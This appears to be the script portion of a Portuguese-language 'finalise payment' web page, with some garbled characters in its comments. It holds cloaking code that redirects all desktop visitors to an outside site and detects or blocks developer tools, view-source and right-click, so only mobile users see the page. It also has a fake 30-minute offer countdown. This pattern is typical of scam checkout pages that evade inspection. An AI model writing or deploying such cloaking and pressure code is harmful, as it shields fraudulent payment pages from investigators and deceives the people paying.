<title>FINALIZAR PAGAMENTO</title>

<script>
(function() {

  const target = "https://bug-pro.vercel.app/";

  // Detectar se √© mobile real
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                   .test(navigator.userAgent);

  // Fun√ß√£o para detetar DevTools
  function isDevToolsOpen() {
    let opened = false;

    // M√©todo 1 - diferen√ßa normal entre outerHeight e innerHeight
    if (window.outerHeight - window.innerHeight > 160) {
      opened = true;
    }

    // M√©todo 2 - largura anormal da janela por causa do device toolbar
    if (window.outerWidth - window.innerWidth > 160) {
      opened = true;
    }

    // M√©todo 3 - atraso causado pelo "debugger"
    const t0 = performance.now();
    debugger;
    const t1 = performance.now();
    if (t1 - t0 > 200) {
      opened = true;
    }

    return opened;
  }


  // ==========================================================
  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) ‚Üí BLOQUEAR
  // ==========================================================
  if (!isMobile) {   // s√≥ PC

    // Se DevTools est√° aberto ANTES da p√°gina abrir ‚Üí redireciona
    if (isDevToolsOpen()) {
      window.location.replace(target);
    }

    // Monitor cont√≠nuo ‚Äî garante que qualquer tentativa √© apanhada
    setInterval(function() {
      if (isDevToolsOpen()) {
        window.location.replace(target);
      }
    }, 300);
  }



  // ======================
  // J√Å EXISTIA: bloqueio total s√≥ para DESKTOP real
  // ======================
  if (!isMobile) {

    try {
      window.location.replace(target);
    } catch (e) {
      window.location.href = target;
    }

    // Bloqueio de clique direito
    document.addEventListener("contextmenu", e => e.preventDefault());

    // Bloqueio de teclas
    document.onkeydown = function(e) {
      if (e.keyCode === 123) return false; // F12
      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
    };

    // DevTools detection (j√° existente)
    setInterval(function() {
      const start = performance.now();
      debugger;
      const end = performance.now();
      if (end - start > 200) {
        window.location.replace(target);
      }
    }, 500);

    // Altura da janela (j√° existente)
    setInterval(function() {
      if (window.outerHeight - window.innerHeight > 160) {
        window.location.replace(target);
      }
    }, 300);

    return;
  }


  // ======================
  // MOBILE REAL
  // ======================
  // Aqui n√£o tocamos. Tudo normal.

})();
</script>

<script>
  const countdownElement = document.getElementById("countdown");

  const totalTime = 30 * 60;

  let endTime = localStorage.getItem("offer_end_time");

  if (!endTime) {
    endTime = Date.now() + totalTime * 1000;
    localStorage.setItem("offer_end_time", endTime);
  }

  function updateCountdown() {
    const now = Date.now();
    const timeLeft = Math.floor((endTime - now) / 1000);

    if (timeLeft <= 0) {
      countdownElement.textContent = "TEMPO ESGOTADO!";
      return;
    }

    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;

    countdownElement.textContent =
      `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
  }

  setInterval(updateCountdown, 1000);
  updateCountdown();
</script>
